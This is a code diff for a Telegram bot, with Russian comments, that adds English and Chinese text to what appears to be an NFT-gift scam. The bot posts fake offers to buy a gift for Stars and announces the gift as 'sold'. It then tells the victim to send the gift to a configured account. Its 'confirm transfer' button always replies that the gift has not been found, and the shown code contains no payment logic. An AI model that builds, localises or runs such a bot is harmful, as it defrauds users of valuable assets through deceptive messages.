@@ -25,33 +25,66 @@ WEBHOOK_URL = f"{WEBHOOK_HOST}{WEBHOOK_PATH}"
 PORT = int(os.getenv("PORT", 8080))
 DB_NAME = "bot_database.db"
 
-# Словарь эмодзи по умолчанию (ключ: [текст по умолчанию, ID премиум])
+# Словарь для хранения активных предложений в памяти {message_id: nft_name}
+# В реальном проекте лучше хранить в БД, но для базовой работы хватит и словаря
+active_offers = {}
+
+# --- ЛОКАЛИЗАЦИЯ (i18n) ---
+LOCALES = {
+    "ru": {
+        "offer": "Пользователь <b>{giver}</b> предлагает\nВам <b>{amount}</b> {star} звёзд за подарок\n<b>{link_html}</b>.\n\nПредложение действует ещё 6ч.",
+        "decline_btn": "Отклонить",
+        "accept_btn": "Принять",
+        "decline_text": "❌ <b>Предложение отклонено.</b>",
+        "accept_alert": "После принятия следуйте инструкциям бота для дальнейших действий.\n\nЕсли вы всё прочитали и ознакомились, нажмите «ОК».",
+        "sold_text": "{gift} Подарок: <b>{nft_name}</b>\nуспешно продан!\n\n<b>Передайте подарок</b>\n<b>покупателю для зачисления</b>\n<b>звёзд.</b>",
+        "transfer_btn": "Передать NFT",
+        "how_to_btn": "Как передать?",
+        "instruction_text": "<b>Инструкция для завершения сделки:</b>\n1. Передайте подарок пользователю\n@{target}.\n2. Нажмите «Передать подарок» и\nвыберите <b>{nft_name}</b>.\n3. Подтвердите передачу подарка.\n\nПредложение действительно 24 часа.",
+        "confirm_btn": "Подтвердить передачу",
+        "confirm_alert": "{clock} Подарок пока не найден на аккаунте. Ожидайте автоматической проверки."
+    },
+    "eng": {
+        "offer": "User <b>{giver}</b> offers\nYou <b>{amount}</b> {star} stars for the gift\n<b>{link_html}</b>.\n\nOffer is valid for 6 hours.",
+        "decline_btn": "Decline",
+        "accept_btn": "Accept",
+        "decline_text": "❌ <b>Offer declined.</b>",
+        "accept_alert": "After accepting, follow the bot's instructions for further actions.\n\nIf you have read and understood everything, click «OK».",
+        "sold_text": "{gift} Gift: <b>{nft_name}</b>\nsuccessfully sold!\n\n<b>Transfer the gift</b>\n<b>to the buyer to credit</b>\n<b>stars.</b>",
+        "transfer_btn": "Transfer NFT",
+        "how_to_btn": "How to transfer?",
+        "instruction_text": "<b>Instructions to complete the deal:</b>\n1. Transfer the gift to the user\n@{target}.\n2. Click «Transfer gift» and\nselect <b>{nft_name}</b>.\n3. Confirm the gift transfer.\n\nOffer is valid for 24 hours.",
+        "confirm_btn": "Confirm transfer",
+        "confirm_alert": "{clock} Gift not found on the account yet. Please wait for automatic verification."
+    },
+    "cn": {
+        "offer": "用户 <b>{giver}</b> 向您提议\n用 <b>{amount}</b> {star} 星币购买礼物\n<b>{link_html}</b>。\n\n提议有效期为 6 小时。",
+        "decline_btn": "拒绝",
+        "accept_btn": "接受",
+        "decline_text": "❌ <b>提议已拒绝。</b>",
+        "accept_alert": "接受后，请按照机器人的指示进行后续操作。\n\n如果您已阅读并了解所有内容，请点击“确定”。",
+        "sold_text": "{gift} 礼物：<b>{nft_name}</b>\n已成功售出！\n\n<b>请将礼物转移给</b>\n<b>买家以计入</b>\n<b>星币。</b>",
+        "transfer_btn": "转移 NFT",
+        "how_to_btn": "如何转移？",
+        "instruction_text": "<b>完成交易的指示：</b>\n1. 将礼物转移给用户\n@{target}。\n2. 点击“转移礼物”并\n选择 <b>{nft_name}</b>。\n3. 确认礼物转移。\n\n提议有效期为 24 小时。",
+        "confirm_btn": "确认转移",
+        "confirm_alert": "{clock} 账户上尚未找到礼物。请等待自动验证。"
+    }
+}
+
+# Словарь эмодзи по умолчанию
 DEFAULT_EMOJIS = {
-    "star": ["⭐", None],       # Звезда
-    "gift": ["🎁", None],       # Подарок (успешно продан)
-    "decline": ["❌", None],    # Отклонить
-    "accept": ["✅", None],     # Принять
-    "transfer": ["➡️", None],   # Передать NFT
-    "how_to": ["❓", None],     # Как передать
-    "confirm": ["✅", None],    # Подтвердить передачу
-    "help_doc": ["📄", None],   # Инструкция
-    "ru_flag": ["🇷🇺", None],   # Флаг РФ
-    "eng_flag": ["🇬🇧", None],  # Флаг Англии
-    "tools": ["🛠", None],      # Параметры
-    "clock": ["⏳", None]       # Ожидание
+    "star": ["⭐", None], "gift": ["🎁", None], "decline": ["❌", None], "accept": ["✅", None],
+    "transfer": ["➡️", None], "how_to": ["❓", None], "confirm": ["✅", None], "help_doc": ["📄", None],
+    "ru_flag": ["🇷🇺", None], "eng_flag": ["🇬🇧", None], "cn_flag": ["🇨🇳", None], "tools": ["🛠", None], "clock": ["⏳", None]
 }
 
 # --- БАЗА ДАННЫХ ---
 async def init_db():
     async with aiosqlite.connect(DB_NAME) as db:
-        # Настройки
         await db.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
-        # Шаблоны
         await db.execute('''CREATE TABLE IF NOT EXISTS templates (id INTEGER PRIMARY KEY AUTOINCREMENT, text TEXT)''')
-        # Эмодзи
         await db.execute('''CREATE TABLE IF NOT EXISTS emojis (key TEXT PRIMARY KEY, emoji_id TEXT)''')
-        
-        # Инициализация
         await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('target_username', 'Gifter_Manager')")
         await db.commit()
 
@@ -68,14 +101,12 @@ async def set_setting(key: str, value: str):
 
 # --- ХЕЛПЕРЫ ДЛЯ ЭМОДЗИ ---
 async def get_emoji_id(key: str):
-    """Возвращает ID премиум эмодзи, если он задан."""
     async with aiosqlite.connect(DB_NAME) as db:
         async with db.execute("SELECT emoji_id FROM emojis WHERE key = ?", (key,)) as cursor:
             row = await cursor.fetchone()
             return row[0] if row and row[0] else None
 
 async def get_emoji_text(key: str):
-    """Возвращает HTML-тег для текста с премиум эмодзи (если задан) или обычный эмодзи."""
     emoji_id = await get_emoji_id(key)
     fallback = DEFAULT_EMOJIS[key][0]
     if emoji_id:
@@ -83,7 +114,6 @@ async def get_emoji_text(key: str):
     return fallback
 
 async def get_button_emoji(key: str):
-    """Возвращает ID эмодзи для кнопки или None."""
     return await get_emoji_id(key)
 
 # --- СОСТОЯНИЯ FSM ---
@@ -99,30 +129,30 @@ router = Router()
 dp.include_router(router)
 
 # --- ГЕНЕРАТОРЫ КЛАВИАТУР ---
-async def get_offer_keyboard(giver_username: str):
+async def get_offer_keyboard(lang: str):
     decline_id = await get_button_emoji("decline")
     accept_id = await get_button_emoji("accept")
     return InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="Отклонить", callback_data=f"decline_{giver_username}", icon_custom_emoji_id=decline_id),
-            InlineKeyboardButton(text="Принять", callback_data=f"accept_{giver_username}", icon_custom_emoji_id=accept_id)
+            InlineKeyboardButton(text=LOCALES[lang]['decline_btn'], callback_data=f"decline:{lang}", icon_custom_emoji_id=decline_id),
+            InlineKeyboardButton(text=LOCALES[lang]['accept_btn'], callback_data=f"accept:{lang}", icon_custom_emoji_id=accept_id)
         ]
     ])
 
-async def get_success_keyboard(target_username: str):
+async def get_success_keyboard(lang: str, target_username: str):
     transfer_id = await get_button_emoji("transfer")
     how_to_id = await get_button_emoji("how_to")
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Передать NFT", url=f"tg://send_gift?to={target_username}", icon_custom_emoji_id=transfer_id)],
-        [InlineKeyboardButton(text="Как передать?", callback_data="how_to_transfer", icon_custom_emoji_id=how_to_id)]
+        [InlineKeyboardButton(text=LOCALES[lang]['transfer_btn'], url=f"tg://send_gift?to={target_username}", icon_custom_emoji_id=transfer_id)],
+        [InlineKeyboardButton(text=LOCALES[lang]['how_to_btn'], callback_data=f"how_to:{lang}", icon_custom_emoji_id=how_to_id)]
     ])
 
-async def get_instruction_keyboard(target_username: str):
+async def get_instruction_keyboard(lang: str, target_username: str):
     transfer_id = await get_button_emoji("transfer")
     confirm_id = await get_button_emoji("confirm")
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Передать подарок", url=f"tg://send_gift?to={target_username}", icon_custom_emoji_id=transfer_id)],
-        [InlineKeyboardButton(text="Подтвердить передачу", callback_data="confirm_transfer", icon_custom_emoji_id=confirm_id)]
+        [InlineKeyboardButton(text=LOCALES[lang]['transfer_btn'], url=f"tg://send_gift?to={target_username}", icon_custom_emoji_id=transfer_id)],
+        [InlineKeyboardButton(text=LOCALES[lang]['confirm_btn'], callback_data=f"confirm:{lang}", icon_custom_emoji_id=confirm_id)]
     ])
 
 def get_admin_keyboard():
@@ -139,6 +169,7 @@ async def show_help(message: Message):
     e_doc = await get_emoji_text("help_doc")
     e_ru = await get_emoji_text("ru_flag")
     e_eng = await get_emoji_text("eng_flag")
+    e_cn = await get_emoji_text("cn_flag")
     e_tools = await get_emoji_text("tools")
     
     text = (
@@ -149,9 +180,12 @@ async def show_help(message: Message):
         "<code>.buy ru https://t.me/nft/Model-328434 1500 stars</code>\n\n"
         f"{e_eng} <b>Пример на английском:</b>\n"
         "<code>.buy eng https://t.me/nft/Model-328434 1500 stars</code>\n\n"
+        f"{e_cn} <b>Пример на китайском:</b>\n"
+        "<code>.buy cn https://t.me/nft/Model-328434 1500 stars</code>\n\n"
         f"{e_tools} <b>Параметры:</b>\n"
         "• <code>ru</code> — русский язык\n"
         "• <code>eng</code> — английский язык\n"
+        "• <code>cn</code> — китайский язык\n"
         "• <code>ссылка</code> — ссылка на подарок\n"
         "• <code>1500</code> — сумма предложения\n"
         "• <code>stars</code> — валюта Stars\n"
@@ -168,30 +202,33 @@ async def show_help(message: Message):
 async def process_buy_command(message: Message):
     args = message.text.split()
     if len(args) < 5:
-        await message.reply("❌ Неверный формат. Используйте <code>.buy ru [ссылка] [сумма] [валюта]</code>")
+        await message.reply("❌ Неверный формат / Invalid format. Используйте <code>.buy ru/eng/cn [ссылка] [сумма] [валюта]</code>")
         return
     
-    lang, link, amount, currency = args[1], args[2], args[3], args[4]
+    lang, link, amount, currency = args[1].lower(), args[2], args[3], args[4]
     
-    # Красивое имя для ссылки (например, BowTie #51908)
+    if lang not in LOCALES:
+        lang = "ru" # Дефолтный язык, если указан неверный
+
+    # Извлекаем красивое имя из ссылки (BowTie #51908)
     nft_name = link.split("/")[-1].replace("-", " #") if "/" in link else "NFT"
-    # Делаем гиперссылку
     link_html = f'<a href="{link}">{nft_name}</a>'
+    
+    # Сохраняем имя NFT в память для дальнейших кнопок
+    active_offers[message.message_id] = nft_name
     
     e_star = await get_emoji_text("star")
     giver_username = message.from_user.username or message.from_user.first_name
     
-    text = (
-        f"Пользователь <b>{giver_username}</b> предлагает\n"
-        f"Вам <b>{amount}</b> {e_star} звёзд за подарок\n"
-        f"<b>{link_html}</b>.\n\n" # Гиперссылка
-        f"Предложение действует ещё 6ч."
+    # Формируем текст на нужном языке
+    text = LOCALES[lang]['offer'].format(
+        giver=giver_username, amount=amount, star=e_star, link_html=link_html
     )
     
     # Превью ссылки наверху сообщения
     link_preview = LinkPreviewOptions(url=link, show_above_text=True)
     
-    await message.reply(text, reply_markup=await get_offer_keyboard(giver_username), link_preview_options=link_preview)
+    await message.reply(text, reply_markup=await get_offer_keyboard(lang), link_preview_options=link_preview)
     try:
         await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
     except Exception:
@@ -199,56 +236,41 @@ async def process_buy_command(message: Message):
 
 # --- ОБРАБОТЧИКИ КНОПОК ---
 
-@router.callback_query(F.data.startswith("decline_"))
+@router.callback_query(F.data.startswith("decline:"))
 async def decline_offer(callback: CallbackQuery):
-    await callback.message.edit_text(text="❌ <b>Предложение отклонено.</b>", reply_markup=None)
-    await callback.answer("Вы отклонили предложение.")
+    lang = callback.data.split(":")[1]
+    await callback.message.edit_text(text=LOCALES[lang]['decline_text'], reply_markup=None)
+    await callback.answer("❌")
 
-@router.callback_query(F.data.startswith("accept_"))
+@router.callback_query(F.data.startswith("accept:"))
 async def accept_offer(callback: CallbackQuery):
-    await callback.answer(
-        "После принятия следуйте инструкциям бота для дальнейших действий.\n\n"
-        "Если вы всё прочитали и ознакомились, нажмите «ОК».",
-        show_alert=True
-    )
+    lang = callback.data.split(":")[1]
     
+    await callback.answer(LOCALES[lang]['accept_alert'], show_alert=True)
+    
+    nft_name = active_offers.get(callback.message.message_id, "NFT")
     target_username = await get_setting("target_username")
     e_gift = await get_emoji_text("gift")
     
-    # Для сохранения превью наверху при редактировании, передаем url из кнопки
-    # Но так как мы нажали кнопку, мы не знаем оригинальную ссылку. 
-    # В реальном боте её лучше сохранять в БД при создании оффера. 
-    # Пока для простоты берем первое сообщение.
-    # (Если превью не нужно при редактировании - можно убрать)
-    text = (
-        f"{e_gift} Подарок: <b>BowTie #51908</b>\n" # Здесь можно динамически подставлять имя
-        "успешно продан!\n\n"
-        "<b>Передайте подарок</b>\n"
-        "<b>покупателю для зачисления</b>\n"
-        "<b>звёзд.</b>"
-    )
-    await callback.message.edit_text(text, reply_markup=await get_success_keyboard(target_username))
+    text = LOCALES[lang]['sold_text'].format(gift=e_gift, nft_name=nft_name)
+    await callback.message.edit_text(text, reply_markup=await get_success_keyboard(lang, target_username))
 
-@router.callback_query(F.data == "how_to_transfer")
+@router.callback_query(F.data.startswith("how_to:"))
 async def how_to_transfer(callback: CallbackQuery):
+    lang = callback.data.split(":")[1]
+    nft_name = active_offers.get(callback.message.message_id, "NFT")
     target_username = await get_setting("target_username")
     
-    text = (
-        "<b>Инструкция для завершения сделки:</b>\n"
-        f"1. Передайте подарок пользователю\n"
-        f"@{target_username}.\n"
-        "2. Нажмите «Передать подарок» и\n"
-        "выберите <b>Chill Flame #292858</b>.\n"
-        "3. Подтвердите передачу подарка.\n\n"
-        "Предложение действительно 24 часа."
-    )
-    await callback.message.edit_text(text, reply_markup=await get_instruction_keyboard(target_username))
+    text = LOCALES[lang]['instruction_text'].format(target=target_username, nft_name=nft_name)
+    await callback.message.edit_text(text, reply_markup=await get_instruction_keyboard(lang, target_username))
 
-@router.callback_query(F.data == "confirm_transfer")
+@router.callback_query(F.data.startswith("confirm:"))
 async def confirm_transfer(callback: CallbackQuery):
+    lang = callback.data.split(":")[1]
     e_clock = await get_emoji_text("clock")
+    
     await callback.answer(
-        f"{e_clock} Подарок пока не найден на аккаунте. Ожидайте автоматической проверки.",
+        LOCALES[lang]['confirm_alert'].format(clock=e_clock),
         show_alert=True
     )
 
